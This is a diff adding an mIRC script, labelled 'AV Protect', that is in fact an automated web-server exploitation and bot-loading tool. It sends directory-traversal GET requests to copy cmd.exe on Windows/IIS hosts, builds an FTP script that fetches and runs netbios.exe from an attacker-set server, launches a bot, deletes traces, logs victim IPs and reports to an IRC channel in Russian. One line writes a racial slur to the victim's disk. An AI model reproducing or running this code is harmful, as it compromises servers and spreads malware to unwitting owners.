@@ -1,0 +1,58 @@
+;ayfa97r43fh3024u8f
+;3q4f0u2q13fj0utr093jf34f
+;AV Protect
+;afo873q048f
+on *:DISCONNECT: {  set %aftp.stat off }
+alias aftp.start { 
+  if ( %aftp.stat  == on ) { halt }
+  if ($lines(un-res.txt) == 0) { halt }
+  set %aftp.bug $read -l1 un-res.txt  |  write -dl1 un-res.txt
+  sockclose scriptftp*  | sockclose b0tzz* |  sockclose delzz* 
+  sockclose aftp | set %aftp.stat on |   set %ip $deltok(%aftp.bug,2-,47) |   set %ftp $remove(%aftp.bug,%ip,/c+dir+c:\)
+  set %ftpcopy %ftp $+ /c+copy+c:\winnt\system32\cmd.exe+az.exe
+  set %ftp1 $deltok(%ftp,2-,47) | set %ftp2 $left(%ftp1,2)
+  if (%ftp2 == ..) { set %ftp / }
+  else { set %ftp / $+ %ftp1 $+ / } 
+  set %ftp %ftp $+ az.exe? |   sockopen aftp %ip 80
+  .timeraftp.Tout 1 25 Aftp.Tout
+}
+on *:sockopen:aftp: {
+  if ($sockerr > 0) {  halt }
+  sockwrite -nt $sockname GET %ftpcopy
+}
+on *:sockread:aftp: {
+  sockread -f %ftp1
+  if (1 file(s) copied isin %ftp1) { 
+    .timeraftp.Tout off
+    .timeraftp.Tout2 1 1000 aftp.Tout2
+    /msg %chan.for.join 14(4внимание14)0:14(15файл - cmd.exe14)0:14(15скопирован успешно14)0:14(15 $+ %ip $+ %ftp $+ /c+dir+c:\ $+ 14)
+    set %tfp2 0 |  ftpscript 
+  }
+  if (Access is denied isin %ftp1) { set %aftp.stat off | aftp.start | /msg %chan.for.join 14(4внимание14)0:14(доступ запрещён14)  }
+}
+alias Aftp.Tout  { sockclose aftp | set %aftp.stat off | aftp.start  }
+alias aftp.Tout2 { sockclose aftp | dozz }
+alias ftpscript {    inc %tfp2 1 |   sockopen scriptftp. $+ %tfp2 %ip 80  }
+on *:sockopen:scriptftp*: {
+  if ($sockerr > 0) { halt }
+  if ( $gettok($sockname,2,46) == 1 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+open+ $+ %aftp.server $+ >c:\winnt\q.scr+&&+echo+user+ $+ %aftp.login $+ >>c:\winnt\q.scr+&&+echo+ $+ %aftp.pass $+ >>c:\winnt\q.scr++&&+echo+binary>>c:\winnt\q.scr+&&+echo+get+netbios.exe+c:\winnt\temp.exe>>c:\winnt\q.scr+&&+echo+bye>>c:\winnt\q.scr+&&+ftp+-s:c:\winnt\q.scr+-n+-d+&&+echo+cleared>c:\winnt\q.scr+&&+c:\winnt\temp.exe+&&+del+c:\winnt\temp.exe
+  if ( $gettok($sockname,2,46) == 2 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+1>>c:\h.scr
+  if ( $gettok($sockname,2,46) == 3 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+2>>c:\h.scr
+  if ( $gettok($sockname,2,46) == 4 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+3>>c:\h.scr
+  if ( $gettok($sockname,2,46) == 5 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+4>>c:\h.scr
+  if ( $gettok($sockname,2,46) == 6 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+5>>c:\h.scr
+  if ( $gettok($sockname,2,46) == 7 )  sockwrite -nt $sockname GET %ftp $+ /c+echo+HeLLo+NiggAzZz>>c:\h.scr
+  if ( $gettok($sockname,2,46) <= 7 ) {  ftpscript }
+  if ( $gettok($sockname,2,46) == 8 )  { /msg %chan.for.join Ошибка! Не удалось скопировать cmd.exe
+    }
+}
+on *:sockclose:scriptftp*: {
+  if ( $gettok($sockname,2,46) == 2 ) {  .timeraftp.Tout2 off  | delzz  |  b0tl0ad  }
+}
+alias dozz { sockclose scriptftp* | delzz  |  b0tl0ad  }
+alias OuTLoadBot { sockclose b0tzz*  | set %aftp.stat off | aftp.start   }
+alias b0tl0ad { sockopen b0tzz $+ $rand(0,999999) %ip 80 }
+on *:sockopen:b0tzz*: {    sockwrite -nt $sockname GET %ftp $+ /c+c:\sysnet32.exe |  .timeruotloadb 1 20 OuTLoadBot    }
+on *:sockclose:b0tzz*: {  .timeruotloadb off | /msg %chan.for.join 14(4внимание14)0:14(15запуск бота произведён14)0:14(15бот прибудет с минуты на минуту14)  | write ip.txt $sock($sockname).ip  | set %aftp.stat off | aftp.start  }
+alias delzz {   sockopen delzz $+ $rand(0,999999) %ip 80 }
+on *:sockopen:delzz*: {    sockwrite -nt $sockname GET %ftp $+ /c+del+c:\test.scr+&&+del+c:\test.scr+&&+del+c:\tests.scr+&&+del+sysnet32.exe    }
